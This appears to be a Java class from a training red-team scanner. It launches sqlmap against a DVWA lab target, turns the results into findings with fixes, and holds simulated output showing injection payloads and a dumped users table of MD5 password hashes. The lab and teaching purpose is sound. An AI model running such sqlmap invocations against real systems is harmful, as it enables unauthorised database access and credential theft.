package com.webguard.redteam;

import com.webguard.models.Vulnerability;
import com.webguard.models.VulnerabilityReport;

import java.util.ArrayList;
import java.util.List;
import java.util.function.Consumer;

/**
 * SqlmapScanner
 *
 * Extends ToolLauncher — Step 3 of Red Team scan sequence.
 * Tests DVWA login and SQLi parameter for SQL injection.
 * Runs: sqlmap -u "http://target/dvwa/vulnerabilities/sqli/?id=1" --batch --level=2
 */
public class SqlmapScanner extends ToolLauncher {

    public SqlmapScanner(String target, int port, VulnerabilityReport report,
                         Consumer<String> outputCallback,
                         Consumer<Vulnerability> findingCallback) {
        super(target, port, report, outputCallback, findingCallback);
    }

    @Override
    public String getToolName() { return "sqlmap"; }

    @Override
    protected String[] buildCommand() {
        return new String[]{
            "sqlmap",
            "-u", "http://" + target + ":" + port + "/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
            "--batch", "--level=2", "--risk=1",
            "--dbms=mysql", "--technique=BEU",
            "--output-dir=/tmp/sqlmap_webguard"
        };
    }

    @Override
    protected List<Vulnerability> parseOutput(List<String> lines) {
        List<Vulnerability> findings = new ArrayList<>();
        boolean sqliFound = false;
        boolean dumpFound = false;

        for (String line : lines) {
            String lower = line.toLowerCase();

            if ((lower.contains("parameter") && lower.contains("vulnerable")) && !sqliFound) {
                sqliFound = true;
                findings.add(new Vulnerability(
                    "SQL Injection — GET Parameter 'id'",
                    Vulnerability.Severity.CRITICAL, 10.0,
                    "/dvwa/vulnerabilities/sqli/?id=1",
                    line.trim(),
                    "Use prepared statements: mysqli_prepare() with bind_param(). Never concatenate user input into SQL.",
                    "sqlmap"
                ));
            }

            if (lower.contains("dumping") && lower.contains("users") && !dumpFound) {
                dumpFound = true;
                findings.add(new Vulnerability(
                    "Database Dump — DVWA Users Table Exposed",
                    Vulnerability.Severity.CRITICAL, 10.0,
                    "/dvwa/vulnerabilities/sqli/",
                    "sqlmap dumped users table: admin credentials extracted",
                    "Hash all passwords with password_hash(PASSWORD_BCRYPT). Remove MD5 hashing.",
                    "sqlmap"
                ));
            }

            if (lower.contains("md5") || lower.contains("password_hash")) {
                findings.add(new Vulnerability(
                    "Passwords Stored as MD5 (Broken Hash)",
                    Vulnerability.Severity.HIGH, 8.1,
                    "dvwa.users table",
                    "MD5 hashes found in database dump",
                    "Replace MD5 with PHP password_hash(). MD5 is broken for password storage.",
                    "sqlmap"
                ));
            }
        }
        return findings;
    }

    @Override
    protected List<String> getSimulatedOutput() {
        return List.of(
            "        ___",
            "       __H__",
            " ___ ___[)]_____ ___ ___  {1.7.8#stable}",
            "",
            "[14:25:01] [INFO] testing connection to the target URL",
            "[14:25:01] [INFO] checking if the target is protected by some kind of WAF/IPS",
            "[14:25:02] [INFO] testing if the target URL content is stable",
            "[14:25:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'",
            "[14:25:04] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable",
            "[14:25:05] [INFO] GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]",
            "sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:",
            "---",
            "Parameter: id (GET)",
            "    Type: boolean-based blind",
            "    Title: AND boolean-based blind - WHERE or HAVING clause",
            "    Payload: id=1 AND 3541=3541",
            "    Type: error-based",
            "    Title: MySQL >= 5.0 AND error-based",
            "    Payload: id=1 AND (SELECT ... FROM information_schema ...)",
            "---",
            "[14:25:08] [INFO] the back-end DBMS is MySQL",
            "web server operating system: Windows",
            "back-end DBMS: MySQL >= 5.0.12",
            "[14:25:10] [INFO] fetching tables for database: 'dvwa'",
            "[14:25:11] [INFO] dumping entries of table 'users' for database 'dvwa'",
            "Database: dvwa",
            "Table: users",
            "+----+----------+----------------------------------+",
            "| id | username | password (MD5)                   |",
            "+----+----------+----------------------------------+",
            "|  1 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |",
            "|  2 | gordonb  | e99a18c428cb38d5f260853678922e03 |",
            "+----+----------+----------------------------------+"
        );
    }
}
